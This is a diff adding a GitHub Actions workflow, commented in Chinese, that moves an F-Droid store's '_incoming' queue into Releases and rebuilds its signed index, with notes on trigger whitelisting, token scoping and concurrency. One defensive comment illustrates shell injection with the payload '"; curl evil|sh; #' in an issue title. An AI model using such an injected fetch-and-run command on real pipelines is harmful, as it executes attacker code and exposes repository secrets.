@@ -1,0 +1,133 @@
+name: 搬运队列
+
+# **这个文件就是一个功能。** 它干的事只有一件：把 store 的 `_incoming` 暂存队列
+# 搬进各自的正式 Release，重建清单与索引，然后回写（03 §3.2）。
+#
+# 「哪个入口跑哪件事」从前是一个要读出来的东西 —— 三个触发面挤在 store 的
+# forward.yml 里、再由本仓的 on-dispatch.yml 交给 Go 里的一个 switch 去分派。
+# 现在它在**文件名**上：看懂这个文件干什么不需要读任何 `if:` 或 switch。
+#
+# 触发面白名单（03 §4.2）。**不要加下面这几个**：
+#
+#   issues / issue_comment   —— forge 是公有仓库，任何登录用户都能触发，
+#                               而 job 里带着能写 store 的 PAT。
+#   pull_request_target      —— fork 可触发且带 secret + 读写 token，
+#                               公有仓库最经典的泄密面。
+#   release / push           —— forge 不承载数据，这两个事件在这里没有语义，
+#                               白白扩大攻击面。store 侧的事件由 store 自己转发过来。
+on:
+  repository_dispatch:
+    # ⚠️ `types:` 就是路由。打过来一个这里没列的事件类型时，GitHub 返回 **204 且
+    # 什么都不做** —— 没有报错、没有日志、Actions 页面干干净净。所以"让 forge 挂上
+    # 新监听"必须**先于**"让 store 开始发"，见 03 §4.2 与本轮灰度的顺序。
+    types: [intake-incoming]
+  # 手动按钮。§3.2 的搬运有**三条叫法**：人点 Publish（store 侧的 `release` 触发器把它
+  # 翻译过来）、人点按钮（这一种）、上传 CI 发的信标。这一条是给**改执行体的人**调试用的
+  # —— 人平时待在 forge 这边看日志，手边有个按钮比切仓库去点方便。
+  #
+  # ⚠️ 按钮在 store 侧也有一份（同名文件），那才是**日常入口**：人是在 store 的 Release
+  # 页面上传的文件，按钮就在同一页。两边等效（都是同一个 `event_type`）—— 别把哪个
+  # 当成多余的删掉。
+  #
+  # **没有 inputs。** 从前的 `verb` choice 是"把两件事挤进同一个文件"的产物：同一份
+  # 文件既要能搬队列又要能全量对账，才需要问一句"你要哪一个"。文件名即选择之后，
+  # 这个输入连同为它服务的那个四段式 `||` 表达式一起消失了 —— 手动按钮不再可能
+  # "漏填 verb 于是静默跑去全量对账"。
+  workflow_dispatch:
+
+# 本仓库**只有 workflow，没有任何源码**，所以 GITHUB_TOKEN 一个权限都不需要：
+# 执行体走 PAT 从 forge-core 拉，写 store 也走同一把 PAT（§6.2 不变量 1）——
+# 而 PAT 权限是 per-repo 的，这里给得越小越好。
+#
+# ⚠️ `actions/cache` 不吃这个字段 —— 它用的是 runtime token，与 GITHUB_TOKEN 无关。
+permissions: {}
+
+# 所有会**写 store** 的 job 共用一个并发组，于是它们互相排队（见 reconcile.yml 与
+# source-change.yml 里同名的一组）。串行化的收益是消灭一整类竞态：两个事件同时往
+# 同一个 Release 传 asset、或一个对账正推到一半另一个事件又推一次（非快进拒绝）。
+#
+# cancel-in-progress 必须是 false：这些 job 是**维护动作**，中途取消会留下
+# "asset 传了一半、索引还没重建"的中间态。排队等一会儿是更好的代价。
+# 一天也就几次事件，串行的代价约等于零。
+#
+# ⚠️ 这个组**同时**保护着那盘 APK cache：两个写入口共用一盘 cache，而
+# `actions/cache` 的"存"发生在 job 末尾 —— 两个 job 并发时，后存的那个会拿着
+# 自己那份（可能已经过时的）目录覆盖掉先存的那份。串行 = 没有这个问题。
+concurrency:
+  group: store-write
+  cancel-in-progress: false
+
+jobs:
+  intake-incoming:
+    runs-on: ubuntu-latest
+    # ⚠️ 与 reconcile.yml 同一个容器，理由也同一条：**这个动词会走到
+    # `fdroid update`** —— 搬完 `_incoming` 之后要 `RebuildAndCheck`（见
+    # internal/job/intake.go 的 IntakeIncoming），而那一步要 fdroidserver 重建索引、
+    # 要 jarsigner 验签。少了容器，它会**在搬完文件之后**才失败，留下一个
+    # "asset 已经进 Release、索引却没跟着更新"的状态。
+    #
+    # ubuntu-latest 自带的 fdroidserver 2.2.1 解析现代 APK 会直接崩，
+    # trixie 的才行（实测，见 reconcile.yml 里那段注释）。
+    container:
+      image: debian:trixie
+    # ⚠️ 容器 job 的默认 shell 是 **sh（dash）**，Debian 基础镜像里没有 bash。
+    defaults:
+      run:
+        shell: bash
+    # 从 45 放宽到 120：**这个 job 与 reconcile 干的是同一件事** ——
+    # `intake-incoming` 走完搬运之后照样要跑 `RebuildAndCheck`（下载缺失 APK、
+    # 让 fdroidserver 解析整个 repo/、验签）。既然实务量一模一样，
+    # 给一个更小的上界只会让它变成"随机地在某一轮红掉"。
+    # 它是一个**上界**不是预留：正常一轮几秒到几分钟，只有真卡住时才会碰到它。
+    timeout-minutes: 120
+    steps:
+      # 这两条 apt / cache / 取件的事抽成了复合动作，两者都见 .github/actions/ 下的说明。
+      #
+      # ⚠️ 引用写 `$/` 不写 `./`（**三个入口文件与 reconcile.yml 都是**）：`./` 要求先
+      # checkout，而本 job 的容器里没有 git。完整理由写在 reconcile.yml 那一步的注释里。
+      #
+      # ⚠️ 顺序不能换：掩码是 fetch-executor 的第一步，必须**先于**任何会打日志的东西。
+      - name: 装工具链
+        uses: $/.github/actions/setup-fdroid
+
+      # ⚠️ 本 job **不 checkout 任何东西** —— 这里没有源码要取，而 store 是二进制
+      # 自己浅克隆的（STORE_DIR 留空）。但"不 checkout"**不等于**"PAT 碰不到本 job"：
+      # 取件把 PAT 作为 `with.token` 交给了一段第三方代码（见该 action 的说明）。
+      #
+      # 它顺带导出 `FORGE_EXEC` 与 `APK_CACHE_DIR` 两个变量给下面的步骤用。
+      - name: 取执行体
+        uses: $/.github/actions/fetch-executor
+        with:
+          token: ${{ secrets.GH_PAT }}
+
+      - name: 搬 _incoming
+        env:
+          # 一切外部数据只经 env 传入；run: 里是固定脚本文本（禁止 ${{ }} 插值）。
+          # 这一条与 store 侧的入口文件是同一个理由：`${{ }}` 在 run: 里是
+          # 文本拼接，issue 标题里放一个 `"; curl evil|sh; #` 就能执行。
+          #
+          # 这个动词**不读**任何事件字段：搬什么由 forge 自己用 API 去 store 读
+          # （§2.6 的切面），所以除了这四把钥匙之外没有别的输入。
+          STORE_TOKEN: ${{ secrets.GH_PAT }}
+          REPO_KEYSTORE_B64: ${{ secrets.REPO_KEYSTORE_B64 }}
+          REPO_KEYSTORE_PASS: ${{ secrets.REPO_KEYSTORE_PASS }}
+          REPO_KEY_PASS: ${{ secrets.REPO_KEY_PASS }}
+        run: |
+          set -euo pipefail
+          # 这里**不再**掩码：fetch-executor 那个 `Mask the token` 步骤已经 job 级
+          # 生效（同一把 PAT），而二进制启动后第一件事也是 env.AddMask()。
+          # 再掩一次是纯重复。
+
+          # 与 reconcile.yml 同一条现场证据：搬运这一轮里，索引中老版本的 APK
+          # 是从 cache 凑出来的。这里是 0 就说明搬运会**缩小**索引（见 fetch-executor 里
+          # 关于 cache 的那段）。
+          mkdir -p "$APK_CACHE_DIR"
+          echo "cache 目录 $APK_CACHE_DIR 里有 $(find "$APK_CACHE_DIR" -name '*.apk' | wc -l) 个 APK"
+
+          "$FORGE_EXEC" intake-incoming
+
+      # ⚠️ 这里**刻意没有** reconcile.yml 里那条「发布物核对」。
+      # 理由不是省事：那一条验的是**签名指纹**，而指纹只由 keystore 决定 ——
+      # 本 job 与 reconcile 用的是同一个 secret、同一个二进制，指纹不可能在这里
+      # 换一把。把这套克隆 + 核对搬过来，只会让每一次人手点的维护动作都多花
+      # 十几秒，去重复一件一天后就会自动被复核的事（下一次 reconcile）。
